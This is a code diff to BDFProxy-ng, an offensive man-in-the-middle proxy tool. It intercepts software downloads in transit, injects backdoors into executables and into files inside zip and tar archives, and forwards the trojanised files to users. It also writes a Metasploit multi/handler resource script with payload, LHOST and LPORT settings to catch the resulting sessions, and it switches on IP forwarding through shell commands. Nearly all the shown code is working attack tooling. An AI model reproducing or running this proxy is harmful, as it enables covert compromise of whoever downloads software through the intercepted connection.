@@ -40,7 +40,9 @@ import sys
 import pefile
 import logging
 import tempfile
-import libarchive
+import zipfile
+import tarfile
+import json
 import magic
 from contextlib import contextmanager
 from configobj import ConfigObj
@@ -55,54 +57,50 @@ def in_dir(dirpath):
     finally:
         os.chdir(prev)
 
-
-def writeResource(resourceFile, Values):
-    with open(resourceFile, 'w') as f:
+def write_resource(resource_file, values):
+    with open(resource_file, 'w') as f:
         f.write("#USAGE: msfconsole -r thisscriptname.rc\n\n\n")
-        writeStatement0 = "use exploit/multi/handler\n"
-        writeStatement1 = ""
-        writeStatement2 = ""
-        writeStatement3 = ""
-        writeStatement4 = "set ExitOnSession false\n\n"
-        writeStatement5 = "exploit -j -z\n\n"
-        for aDictionary in Values:
+        write_statement0 = "use exploit/multi/handler\n"
+        write_statement1 = ""
+        write_statement2 = ""
+        write_statement3 = ""
+        write_statement4 = "set ExitOnSession false\n\n"
+        write_statement5 = "exploit -j -z\n\n"
+        for aDictionary in values:
             if isinstance(aDictionary, dict):
                 if aDictionary != {}:
                     for key, value in aDictionary.items():
                         if key == 'MSFPAYLOAD':
-                            writeStatement1 = 'set PAYLOAD ' + str(value) + "\n"
+                            write_statement1 = 'set PAYLOAD ' + str(value) + "\n"
                         if key == "HOST":
-                            writeStatement2 = 'set LHOST ' + str(value) + "\n"
+                            write_statement2 = 'set LHOST ' + str(value) + "\n"
                         if key == "PORT":
-                            writeStatement3 = 'set LPORT ' + str(value) + "\n"
-                    f.write(writeStatement0)
-                    f.write(writeStatement1)
-                    f.write(writeStatement2)
-                    f.write(writeStatement3)
-                    f.write(writeStatement4)
-                    f.write(writeStatement5)
+                            write_statement3 = 'set LPORT ' + str(value) + "\n"
+                    f.write(write_statement0)
+                    f.write(write_statement1)
+                    f.write(write_statement2)
+                    f.write(write_statement3)
+                    f.write(write_statement4)
+                    f.write(write_statement5)
 
-
-def dictParse(d):
-    tmpValues = {}
+def dict_parse(d):
+    tmp_values = {}
     for key, value in d.iteritems():
         if isinstance(value, dict):
-            dictParse(value)
+            dict_parse(value)
         if key == 'HOST':
-            tmpValues['HOST'] = value
+            tmp_values['HOST'] = value
         if key == 'PORT':
-            tmpValues['PORT'] = value
+            tmp_values['PORT'] = value
         if key == 'MSFPAYLOAD':
-            tmpValues['MSFPAYLOAD'] = value
+            tmp_values['MSFPAYLOAD'] = value
 
-    resourceValues.append(tmpValues)
-
-def print_size(f):
-    size = len(f) / 1024
-    EnhancedOutput.print_info("File size: {0} KB".format(size))
-
+    resourceValues.append(tmp_values)
 
 class EnhancedOutput:
+    def __init__(self):
+        pass
+
     @staticmethod
     def print_error(txt):
         print "[x] {0}".format(txt)
@@ -131,22 +129,26 @@ class EnhancedOutput:
     def logging_debug(txt):
         logging.debug("[.] Debug: {0}".format(txt))
 
-
-class ArchiveType:
-    blacklist = []
-    maxSize = 0
-    patchCount = 0
-
-    def __init__(self, arType):
-        try:
-            userConfig = ConfigObj(CONFIGFILE)
-            self.blacklist = userConfig[arType]['blacklist']
-            self.maxSize = int(userConfig[arType]['maxSize'])
-            self.patchCount = int(userConfig[arType]['patchCount'])
-        except Exception as e:
-            raise Exception("Missing {0}".format(e))
+    @staticmethod
+    def print_size(f):
+        size = len(f) / 1024
+        EnhancedOutput.print_info("File size: {0} KB".format(size))
 
 class ProxyMaster(controller.Master):
+    user_config = None
+    host_blacklist = []
+    host_whitelist = []
+    keys_blacklist = []
+    keys_whitelist = []
+
+    archive_blacklist = []
+    archive_max_size = 0
+    archive_type = None
+    archive_params = {}
+    archive_patch_count = 0
+
+    patchIT = False
+
     def __init__(self, srv):
         controller.Master.__init__(self, srv)
 
@@ -156,21 +158,13 @@ class ProxyMaster(controller.Master):
 
         self.zipType = {'mimes': ['application/x-zip-compressed', 'application/zip'], 'params': {'type': 'ZIP', 'format': 'zip', 'filter': None}}  # .zip
 
-        self.debType = {'mimes': ['application/x-debian-package', 'application/sarcazzi'], 'params': None}  # .deb
-
         self.gzType = {'mimes': ['application/gzip', 'application/x-gzip', 'application/gnutar'], 'params': {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}}  # .gz
 
         self.tarType = {'mimes': ['application/x-tar'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': None}}  # .tar
 
         self.bzType = {'mimes': ['application/x-bzip2', 'application/x-bzip'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': 'bzip2'}}  # .bz / .bz2
 
-        self.arType = {'mimes': ['application/x-archive'], 'params': {'type': 'AR', 'format': 'ar_bsd', 'filter': None}}  # .ar
-
-        self.xzType = {'mimes': ['application/x-xz'], 'params': {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}}  # .xz
-
-        self.archiveTypes = [self.zipType, self.gzType, self.tarType, self.bzType, self.arType, self.xzType]
-
-        self.patchIT = False
+        self.archiveTypes = [self.zipType, self.gzType, self.tarType, self.bzType]
 
     def run(self):
         try:
@@ -179,209 +173,225 @@ class ProxyMaster(controller.Master):
         except KeyboardInterrupt:
             self.shutdown()
 
-    def setConfig(self):
+    def set_config(self):
         try:
-            self.userConfig = ConfigObj(CONFIGFILE)
-            self.host_blacklist = self.userConfig['hosts']['blacklist']
-            self.host_whitelist = self.userConfig['hosts']['whitelist']
-            self.keys_blacklist = self.userConfig['keywords']['blacklist']
-            self.keys_whitelist = self.userConfig['keywords']['whitelist']
+            self.user_config = ConfigObj(CONFIGFILE)
+            self.host_blacklist = self.user_config['hosts']['blacklist']
+            self.host_whitelist = self.user_config['hosts']['whitelist']
+            self.keys_blacklist = self.user_config['keywords']['blacklist']
+            self.keys_whitelist = self.user_config['keywords']['whitelist']
         except Exception as e:
-            EnhancedOutput.print_error("Missing field from config file" + str(e))
+            EnhancedOutput.print_error("Missing field from config file: {0}".format(e))
 
-    # archInfo example: {'type':'TAR', 'format':'gnutar', 'filter':'bzip2'}
-    def archive_files(self, archFileBytes, archInfo, include_dirs=False):
-
+    def set_config_archive(self, ar):
         try:
-            archiveType = ArchiveType(archInfo['type'])
-        except Exception as ex:
-            EnhancedOutput.print_error(str(ex))
-            EnhancedOutput.print_warning("Returning original file")
-            EnhancedOutput.logging_error("Error setting archive type: {0}. Returning original file.".format(e))
-            return archFileBytes
+            self.archive_type = ar['type']
+            self.archive_blacklist = self.user_config[self.archive_type]['blacklist']
+            self.archive_max_size = int(self.user_config[self.archive_type]['maxSize'])
+            self.archive_patch_count = int(self.user_config[self.archive_type]['patchCount'])
+            self.archive_params = ar
+        except Exception as e:
+            raise Exception("Missing {0} section from config file".format(e))
 
-        print_size(archFileBytes)
+    def check_keyword(self, filename):
+        keyword_check = False
 
-        if len(archFileBytes) > archiveType.maxSize:
-            EnhancedOutput.print_error("{0} over allowed size".format(archInfo['type']))
-            EnhancedOutput.logging_info("{0} maxSize met {1}".format(archInfo['type'], len(archFileBytes)))
-            return archFileBytes
-
-        tmpDir = tempfile.mkdtemp()
-
-        try:
-            with in_dir(tmpDir):
-                flags = libarchive.extract.EXTRACT_OWNER | libarchive.extract.EXTRACT_PERM | libarchive.extract.EXTRACT_TIME
-                libarchive.extract_memory(archFileBytes, flags)
-        except Exception as exce:
-            EnhancedOutput.print_error("Can't extract file. Returning original one")
-            EnhancedOutput.logging_error("Can't extract file: {0}. Returning original one.".format(exce))
-            return archFileBytes
-
-        EnhancedOutput.print_info("{0} file contents and info".format(archInfo['type']))
-        EnhancedOutput.print_info("Compression: {0}".format(archInfo['filter']))
-
-        files_list = list()
-        for dirname, dirnames, filenames in os.walk(tmpDir):
-            dirz = dirname.replace(tmpDir, ".")
-            print "\t{0}".format(dirz)
-            if include_dirs:
-                files_list.append(dirz)
-            for f in filenames:
-                fn = os.path.join(dirz, f)
-                files_list.append(fn)
-                print "\t{0} {1}".format(fn, os.lstat(os.path.join(dirname, f)).st_size)
-
-        patchCount = 0
-        wasPatched = False
-        tmpArchive = tempfile.NamedTemporaryFile()
-
-        try:
-            with libarchive.file_writer(tmpArchive.name, archInfo['format'], archInfo['filter']) as archive:
-                for filename in files_list:
-                    full_path = os.path.join(tmpDir, filename)
-                    EnhancedOutput.print_info(">>> Next file in archive: {0}".format(filename))
-
-                    if os.path.islink(full_path) or not os.path.isfile(full_path):
-                        EnhancedOutput.print_warning("{0} is not a file, skipping".format(filename))
-                        with in_dir(tmpDir):
-                            archive.add_files(filename)
-                        continue
-
-                    if os.lstat(full_path).st_size >= long(self.FileSizeMax):
-                        EnhancedOutput.print_warning("{0} is too big, skipping".format(filename))
-                        with in_dir(tmpDir):
-                            archive.add_files(filename)
-                        continue
-
-                    # Check against keywords
-                    keywordCheck = False
-
-                    if type(archiveType.blacklist) is str:
-                        if archiveType.blacklist.lower() in filename.lower():
-                            keywordCheck = True
-                    else:
-                        for keyword in archiveType.blacklist:
-                            if keyword.lower() in filename.lower():
-                                keywordCheck = True
-                                continue
-
-                    if keywordCheck is True:
-                        EnhancedOutput.print_warning("Archive blacklist enforced!")
-                        EnhancedOutput.logging_info('Archive blacklist enforced on {0}'.format(filename))
-                        continue
-
-                    if patchCount >= archiveType.patchCount:
-                        with in_dir(tmpDir):
-                            archive.add_files(filename)
-                        EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
-                    else:
-                        # create the file on disk temporarily for binaryGrinder to run on it
-                        tmp = tempfile.NamedTemporaryFile()
-                        shutil.copyfile(full_path, tmp.name)
-                        tmp.flush()
-                        patchResult = self.binaryGrinder(tmp.name)
-                        if patchResult:
-                            patchCount += 1
-                            file2 = os.path.join(BDFOLDER, os.path.basename(tmp.name))
-                            EnhancedOutput.print_info("Patching complete, adding to archive file.")
-                            shutil.copyfile(file2, full_path)
-                            EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(filename))
-                            os.remove(file2)
-                            wasPatched = True
-                        else:
-                            EnhancedOutput.print_error("Patching failed")
-                            EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(filename))
-
-                        with in_dir(tmpDir):
-                            archive.add_files(filename)
-                        tmp.close()
-
-        except Exception as exc:
-            EnhancedOutput.print_error("Error while creating the archive: {0}. Returning the original file.".format(exc))
-            EnhancedOutput.logging_error("Error while creating the archive: {0}. Returning original file.".format(exc))
-            shutil.rmtree(tmpDir, ignore_errors=True)
-            tmpArchive.close()
-            return archFileBytes
-
-
-        with open(tmpArchive.name, 'r+b') as f:
-            ret = f.read()
-            f.close()
-
-        # cleanup
-        shutil.rmtree(tmpDir, ignore_errors=True)
-        tmpArchive.close()
-
-        if wasPatched is False:
-            EnhancedOutput.print_info("No files were patched. Forwarding original file")
-            return archFileBytes
+        if type(self.archive_blacklist) is str:
+            if self.archive_blacklist.lower() in filename:
+                keyword_check = True
         else:
-            return ret
+            for keyword in self.archive_blacklist:
+                if keyword.lower() in filename:
+                    keyword_check = True
+                    continue
 
-    def deb_files(self, debFile):
+        return keyword_check
+
+    def inject_tar(self, aTarFileBytes, formatt=None):
+        # When called will unpack and edit a Tar File and return a tar file"
+
+        tmp_file = tempfile.NamedTemporaryFile()
+        tmp_file.write(aTarFileBytes)
+        tmp_file.seek(0)
+
+        compression_mode = ':'
+        if formatt == 'gzip':
+            compression_mode = ':gz'
+        if formatt == 'bzip2':
+            compression_mode = ':bz2'
+
         try:
-            archiveType = ArchiveType('AR')
-        except Exception as e:
-            EnhancedOutput.print_error(str(e))
-            EnhancedOutput.print_warning("Returning original file")
-            EnhancedOutput.logging_error("Error setting archive type: {0}. Returning original file.".format(e))
-            return debFile
+            tar_file = tarfile.open(fileobj=tmp_file, mode='r' + compression_mode)
+        except tarfile.ReadError as ex:
+            EnhancedOutput.print_warning(ex)
+            tmp_file.close()
+            return aTarFileBytes
 
-        print_size(debFile)
+        EnhancedOutput.print_info("TarFile contents and info (compression: {0}):".format(formatt))
 
-        if len(debFile) > archiveType.maxSize:
-            EnhancedOutput.print_error("AR File over allowed size")
-            EnhancedOutput.logging_info("AR File maxSize met {0}".format(len(debFile)))
-            return debFile
+        members = tar_file.getmembers()
+        for info in members:
+            print "\t{0} {1}".format(info.name, info.size)
 
-        tmpDir = tempfile.mkdtemp()
+        new_tar_storage = tempfile.NamedTemporaryFile()
+        new_tar_file = tarfile.open(mode='w' + compression_mode, fileobj=new_tar_storage)
 
-        # first: save the stream to a local file
-        tmpFile = tempfile.NamedTemporaryFile()
-        tmpFile.write(debFile)
-        tmpFile.seek(0)
+        patch_count = 0
+        was_patched = False
 
-        # chdir to the tmpDir which the new ar file resides
-        # and extract it so work on the 'copy' of the stream
-        with in_dir(tmpDir):
-            libarchive.extract_file(tmpFile.name)
+        for info in members:
+            EnhancedOutput.print_info(">>> Next file in tarfile: {0}".format(info.name))
 
-        file2inject = 'data.tar.gz'
-        infoz = {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}
+            if not info.isfile():
+                EnhancedOutput.print_warning("{0} is not a file, skipping".format(info.name))
+                new_tar_file.addfile(info, tar_file.extractfile(info))
+                continue
 
-        if os.path.exists(os.path.join(tmpDir, 'data.tar.xz')):
-            file2inject = 'data.tar.xz'
-            infoz = {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}
+            if info.size >= long(self.FileSizeMax):
+                EnhancedOutput.print_warning("{0} is too big, skipping".format(info.name))
+                new_tar_file.addfile(info, tar_file.extractfile(info))
+                continue
 
-        EnhancedOutput.print_info("Patching {0}".format(file2inject))
-        # recreate the injected archive
-        with open(os.path.join(tmpDir, file2inject), 'r+b') as f:
-            bfz = f.read()
-            f.seek(0)
-            f.write(self.archive_files(bfz, infoz, include_dirs=True))
-            f.flush()
-            f.close()
+            # Check against keywords
+            if self.check_keyword(info.name.lower()) is True:
+                EnhancedOutput.print_warning("Tar blacklist enforced!")
+                EnhancedOutput.logging_info('Tar blacklist enforced on {0}'.format(info.name))
+                continue
 
-        blk = []
+            # Try to patch
+            extracted_file = tar_file.extractfile(info)
 
-        def write_data(data):
-            blk.append(data[:])
-            return len(data[:])
+            if patch_count >= self.archive_patch_count:
+                EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
+                new_tar_file.addfile(info, extracted_file)
+            else:
+                # create the file on disk temporarily for fileGrinder to run on it
+                with tempfile.NamedTemporaryFile() as tmp:
+                    shutil.copyfileobj(extracted_file, tmp)
+                    tmp.flush()
+                    patch_result = self.binaryGrinder(tmp.name)
+                    if patch_result:
+                        patch_count += 1
+                        file2 = os.path.join(BDFOLDER, os.path.basename(tmp.name))
+                        EnhancedOutput.print_info("Patching complete, adding to archive file.")
+                        EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(info.name))
+                        info.size = os.stat(file2).st_size
+                        with open(file2, 'rb') as f:
+                            new_tar_file.addfile(info, f)
+                        os.remove(file2)
+                        was_patched = True
+                    else:
+                        EnhancedOutput.print_error("Patching failed")
+                        EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(info.name))
+                        with open(tmp.name, 'rb') as f:
+                            new_tar_file.addfile(info, f)
 
-        with libarchive.custom_writer(write_data, 'ar_bsd') as archive:
-            archive.add_files(os.path.join(tmpDir, 'debian-binary'))
-            archive.add_files(os.path.join(tmpDir, 'control.tar.gz'))
-            archive.add_files(os.path.join(tmpDir, file2inject))
+        # finalize the writing of the tar file first
+        new_tar_file.close()
 
-        buf = b''.join(blk)
+        if was_patched is False:
+            # If nothing was changed return the original
+            EnhancedOutput.print_info("No files were patched. Forwarding original file")
+            new_tar_storage.close()  # it's automatically deleted
+            return aTarFileBytes
 
-        # clean up
-        shutil.rmtree(tmpDir, ignore_errors=True)
-        tmpFile.close()
+        # then read the new tar file into memory
+        new_tar_storage.seek(0)
+        buf = new_tar_storage.read()
+        new_tar_storage.close()  # it's automatically deleted
 
         return buf
 
+    def inject_zip(self, aZipFile):
+        # When called will unpack and edit a Zip File and return a zip file
+        tmp_file = tempfile.NamedTemporaryFile()
+        tmp_file.write(aZipFile)
+        tmp_file.seek(0)
+
+        zippyfile = zipfile.ZipFile(tmp_file.name, 'r')
+
+        # encryption test
+        try:
+            zippyfile.testzip()
+        except RuntimeError as e:
+            if 'encrypted' in str(e):
+                EnhancedOutput.print_warning("Encrypted zipfile found. Not patching.")
+            else:
+                EnhancedOutput.print_warning("Zipfile test failed. Returning original archive")
+            zippyfile.close()
+            tmp_file.close()
+            return aZipFile
+
+        EnhancedOutput.print_info("ZipFile contents and info:")
+
+        for info in zippyfile.infolist():
+            print "\t{0} {1}".format(info.filename, info.file_size)
+
+        tmpDir = tempfile.mkdtemp()
+        zippyfile.extractall(tmpDir)
+
+        patch_count = 0
+        was_patched = False
+
+        for info in zippyfile.infolist():
+            EnhancedOutput.print_info(">>> Next file in zipfile: {0}".format(info.filename))
+            actual_file = os.path.join(tmpDir, info.filename)
+
+            if os.path.islink(actual_file) or not os.path.isfile(actual_file):
+                EnhancedOutput.print_warning("{0} is not a file, skipping".format(info.filename))
+                continue
+
+            if os.lstat(actual_file).st_size >= long(self.FileSizeMax):
+                EnhancedOutput.print_warning("{0} is too big, skipping".format(info.filename))
+                continue
+
+            # Check against keywords
+            if self.check_keyword(info.filename.lower()) is True:
+                EnhancedOutput.print_warning("Zip blacklist enforced!")
+                EnhancedOutput.logging_info('Zip blacklist enforced on {0}'.format(info.filename))
+                continue
+
+            if patch_count >= self.archive_patch_count:
+                EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
+                break
+            else:
+                patch_result = self.binaryGrinder(actual_file)
+                if patch_result:
+                    patch_count += 1
+                    file2 = os.path.join(BDFOLDER, os.path.basename(info.filename))
+                    EnhancedOutput.print_info("Patching complete, adding to archive file.")
+                    shutil.copyfile(file2, actual_file)
+                    EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(info.filename))
+                    os.remove(file2)
+                    was_patched = True
+                else:
+                    EnhancedOutput.print_error("Patching failed")
+                    EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(info.filename))
+
+        zippyfile.close()
+
+        if was_patched is False:
+            EnhancedOutput.print_info("No files were patched. Forwarding original file")
+            tmp_file.close()
+            shutil.rmtree(tmpDir, ignore_errors=True)
+            return aZipFile
+
+        zip_result = zipfile.ZipFile(tmp_file.name, 'w', zipfile.ZIP_DEFLATED)
+
+        for base, dirs, files in os.walk(tmpDir):
+            for afile in files:
+                filename = os.path.join(base, afile)
+                zip_result.write(filename, arcname=filename.replace(tmpDir + '/', ''))
+
+        zip_result.close()
+        # clean up
+        shutil.rmtree(tmpDir, ignore_errors=True)
+
+        with open(tmp_file.name, 'rb') as f:
+            zip_data = f.read()
+            tmp_file.close()
+
+        return zip_data
 
     def str2bool(self, val):
         if val.lower() == 'true':
@@ -640,6 +650,23 @@ class ProxyMaster(controller.Master):
                     setattr(self, key, value)
                     EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(key, value))
 
+    def inject(self, flow):
+        EnhancedOutput.print_size(flow)
+
+        if len(flow) > self.archive_max_size:
+            EnhancedOutput.print_error("{0} over allowed size".format(self.archive_type))
+            EnhancedOutput.logging_info("{0} maxSize met {1}".format(self.archive_type, len(flow)))
+            return flow
+
+        buf = None
+
+        if self.archive_type == "ZIP":
+            buf = self.inject_zip(flow)
+        elif self.archive_type == "TAR":
+            buf = self.inject_tar(flow, self.archive_params['filter'])
+
+        return buf
+
     def handle_request(self, flow):
         print "*" * 10, "REQUEST", "*" * 10
         EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
@@ -649,13 +676,14 @@ class ProxyMaster(controller.Master):
 
     def handle_response(self, flow):
         # Read config here for dynamic updating
+        self.set_config()
 
-        for target in self.userConfig['targets'].keys():
+        for target in self.user_config['targets'].keys():
             if target == 'ALL':
-                self.parse_target_config(self.userConfig['targets']['ALL'])
+                self.parse_target_config(self.user_config['targets']['ALL'])
 
             if target in flow.request.host:
-                self.parse_target_config(self.userConfig['targets'][target])
+                self.parse_target_config(self.user_config['targets'][target])
 
         print "=" * 10, "RESPONSE", "=" * 10
 
@@ -683,13 +711,9 @@ class ProxyMaster(controller.Master):
 
             flow.reply()
         else:
-
             mime_type = magic.from_buffer(flow.reply.obj.response.content, mime=True)
 
-            if mime_type in self.debType['mimes'] and self.str2bool(self.CompressedFiles) is True:
-                flow.reply.obj.response.content = self.deb_files(flow.reply.obj.response.content)
-
-            elif mime_type in self.binaryMimeType['mimes']:
+            if mime_type in self.binaryMimeType['mimes']:
                 tmp = tempfile.NamedTemporaryFile()
                 tmp.write(flow.reply.obj.response.content)
                 tmp.flush()
@@ -700,8 +724,12 @@ class ProxyMaster(controller.Master):
                     EnhancedOutput.print_info("Patching complete, forwarding to user.")
                     EnhancedOutput.logging_info("Patching complete for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))
 
-                    with open(os.path.join(BDFOLDER, os.path.basename(tmp.name)), 'r+b') as file2:
+                    bd_file = os.path.join(BDFOLDER, os.path.basename(tmp.name))
+                    with open(bd_file, 'r+b') as file2:
                         flow.reply.obj.response.content = file2.read()
+                        file2.close()
+
+                    os.remove(bd_file)
                 else:
                     EnhancedOutput.print_error("Patching failed")
                     EnhancedOutput.logging_info("Patching failed for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))
@@ -710,7 +738,12 @@ class ProxyMaster(controller.Master):
             else:
                 for archive in self.archiveTypes:
                     if mime_type in archive['mimes'] and self.str2bool(self.CompressedFiles) is True:
-                        flow.reply.obj.response.content = self.archive_files(flow.reply.obj.response.content, archive['params'])
+                        try:
+                            self.set_config_archive(archive['params'])
+                            flow.reply.obj.response.content = self.inject(flow.reply.obj.response.content)
+                        except Exception as exc:
+                            EnhancedOutput.print_error(exc)
+                            EnhancedOutput.print_warning("Returning original file")
 
             flow.reply()
 
@@ -722,32 +755,32 @@ CONFIGFILE = "bdfproxy.cfg"
 BDFOLDER = "backdoored"
 
 # Initial CONFIG reading
-userConfig = ConfigObj(CONFIGFILE)
+user_config = ConfigObj(CONFIGFILE)
 
 #################### BEGIN OVERALL CONFIGS ############################
 # DOES NOT UPDATE ON THE FLY
-resourceScript = userConfig['Overall']['resourceScriptFile']
+resourceScript = user_config['Overall']['resourceScriptFile']
 
-config = proxy.ProxyConfig(clientcerts=os.path.expanduser(userConfig['Overall']['certLocation']),
-                           body_size_limit=int(userConfig['Overall']['MaxSizeFileRequested']),
-                           port=int(userConfig['Overall']['proxyPort']),
-                           mode=userConfig['Overall']['proxyMode'],
+config = proxy.ProxyConfig(clientcerts=os.path.expanduser(user_config['Overall']['certLocation']),
+                           body_size_limit=int(user_config['Overall']['MaxSizeFileRequested']),
+                           port=int(user_config['Overall']['proxyPort']),
+                           mode=user_config['Overall']['proxyMode'],
                            )
 
-if userConfig['Overall']['proxyMode'] != "None":
-    config.proxy_mode = {'sslports': userConfig['Overall']['sslports'],
+if user_config['Overall']['proxyMode'] != "None":
+    config.proxy_mode = {'sslports': user_config['Overall']['sslports'],
                          'resolver': platform.resolver()
                          }
 
 server = ProxyServer(config)
 
-numericLogLevel = getattr(logging, userConfig['Overall']['loglevel'].upper(), None)
+numericLogLevel = getattr(logging, user_config['Overall']['loglevel'].upper(), None)
 
 if not isinstance(numericLogLevel, int):
     EnhancedOutput.print_error("INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
     sys.exit(1)
 
-logging.basicConfig(filename=userConfig['Overall']['logname'],
+logging.basicConfig(filename=user_config['Overall']['logname'],
                     level=numericLogLevel,
                     format='%(asctime)s %(message)s'
                     )
@@ -757,25 +790,28 @@ logging.basicConfig(filename=userConfig['Overall']['logname'],
 # Write resource script
 EnhancedOutput.print_warning("Writing resource script.")
 resourceValues = []
-dictParse(userConfig['targets'])
+dict_parse(user_config['targets'])
 try:
-    writeResource(str(resourceScript), resourceValues)
+    write_resource(str(resourceScript), resourceValues)
 except Exception as e:
-    EnhancedOutput.print_error(str(e))
+    EnhancedOutput.print_error(e)
     sys.exit(1)
 
 EnhancedOutput.print_warning("Resource writen to {0}".format(str(resourceScript)))
-EnhancedOutput.print_warning("Configuring forwarding ('echo 1 > /proc/sys/net/ipv4/ip_forward')")
+EnhancedOutput.print_warning("Configuring traffic forwarding")
 
 try:
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    if sys.platform == "darwin":
+        os.system("sysctl -w net.inet.ip.forwarding=1")
+    elif sys.platform.startswith("linux"):
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 except Exception as e:
-    EnhancedOutput.print_error(str(e))
+    EnhancedOutput.print_error(e)
     sys.exit(1)
 
 m = ProxyMaster(server)
 try:
-    m.setConfig()
+    m.set_config()
 except Exception as e:
     EnhancedOutput.print_error("Your config file is broken: {0}".format(e))
     EnhancedOutput.logging_error("Your config file is broken: {0}".format(e))
@@ -784,4 +820,6 @@ except Exception as e:
 EnhancedOutput.print_info("Starting BDFProxy")
 EnhancedOutput.print_info("Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com")
 EnhancedOutput.logging_info("################ Starting BDFProxy-ng ################")
+
+EnhancedOutput.logging_info("ConfigDump {0}".format(json.dumps(user_config, sort_keys=True, indent=4)))
 m.run()
